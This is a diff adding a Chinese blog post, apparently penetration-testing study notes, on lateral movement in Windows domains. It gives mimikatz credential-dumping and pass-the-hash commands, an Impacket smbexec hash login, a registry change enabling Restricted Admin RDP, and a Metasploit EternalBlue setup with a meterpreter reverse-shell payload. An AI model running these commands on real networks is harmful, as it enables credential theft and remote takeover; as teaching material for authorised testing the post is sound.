@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第5章--横向移动下(哈希传递等) | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.哈希传递
+PTH攻击的工具：
+1.Mimikatz
+2.Impacket
+3.CrackMapExec
+4.Powershell
+5.Evil-Winrm
+6.Metesploite
+
+1.1 哈希传递攻击的利用
+pth原理：
+攻击者直..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第5章--横向移动下(哈希传递等)</h2>
+            <div class="post-date">2023-04-14</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong-shang-ha-xi-chuan-di.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="1哈希传递">1.哈希传递</h1>
+<p>PTH攻击的工具：</p>
+<pre><code>1.Mimikatz
+2.Impacket
+3.CrackMapExec
+4.Powershell
+5.Evil-Winrm
+6.Metesploite
+</code></pre>
+<p><strong>1.1 哈希传递攻击的利用</strong><br>
+pth原理：<br>
+攻击者直接通过LM Hash 和 NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
+<p>如果禁用了ntlm认证，psexec无法利用获得的ntml，hash经行远程连接，但是minikatz还是可以攻击成功。对于8.1/2012r2 ,安装了kb2871997的win7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击。</p>
+<p>KB2871997补丁影响：<br>
+pth：没打补丁所有用户都可以连接，打了补丁只有administrator可连接。<br>
+ptk：打了补丁可使用，所有用户都可连接，通过aes256连接。<br>
+具体：https://www.freebuf.com/column/220740.html</p>
+<p><code>1.利用mimikatz进行PTH</code></p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit #抓取用户哈希
+ 
+#横向返回一个与域中所有符合要求的目标进行连接后的cmd
+mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:god.org /ntlm:b93c17875ad053ce97c3063a6a02c15e&quot;
+</code></pre>
+<p><code>2.利用Impacket 进行PTH</code><br>
+可使用pyinstaller打包成exe文件(此外还可以使用psexec.py, wmiexec.py进行PTH横向)</p>
+<pre><code>python smbexec.py -hashes ::b93c17875ad053ce97c3063a6a02c15e god.org/administrator@192.168.52.141
+</code></pre>
+<p><strong>1.2 利用PTH登录远程桌面</strong><br>
+条件:</p>
+<pre><code>远程主机开启受限管理员模式
+用于远程桌面的用户位于远程主机的管理员组中(受限管理员模式只对管理员组用户有效,如果获取哈希的用户属于远程桌面用户组就无法进行哈希传递攻击)
+拿到远程主机上能够登录的用户的哈希
+WinServer2012 R2开始采用新版RDP, 支持受限管理员模式, 在该模式下才可以使用哈希进行哈希传递登录而不需要输入密码(在Win8.1和WinServer2012 R2上默认开启)
+</code></pre>
+<p>没有开启受限管理员的主机可以通过下面命令开启:</p>
+<pre><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p>步骤：<br>
+<code>1.查看主机受限模式开启状态:</code></p>
+<pre><code>reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin    #输出为0则已启动,为1则未启动
+</code></pre>
+<p><code>2.远程主机开启受限管理员模式的话就可以通过Mimikatz进行攻击：</code></p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:h0cksr.bxs /ntlm: \&quot;/run:mstsc.exe /restrictedadmin\&quot;&quot;
+ 
+mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:god.org /ntlm:b93c17875ad053ce97c3063a6a02c15e \&quot;/run:mstsc.exe /restrictedadmin\&quot;&quot;
+</code></pre>
+<h1 id="2-ehernalblue永恒之蓝">2 EhernalBlue(永恒之蓝)</h1>
+<p>永恒之蓝的原理不再多说了, 主要就是Windows SMB v1服务器错误处理来自远程的特制数据包从而产生漏洞, 测试的时候如果发现有445端口开启可以流程化走一下看看有没有漏洞</p>
+<p>此外类似原理的还有SM08-067, CVE-2019-0807等均可用于横向</p>
+<pre><code>msfconsole
+use auxiliary/scanner/smb/smb_ms17_010  #这个只是检测模块,用于检查是否存在漏洞
+set rhosts 192.168.30.1/24
+set threads 10
+run
+ 
+use exploit/windows/smb/ms17_010_eternalblue
+set payload payload/windows/x64/meterpreter/reverse_tcp
+set rhosts 192.168.92.198
+set lhost 192.168.92.128
+set lport 444
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第5章--横向移动上(基础知识)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
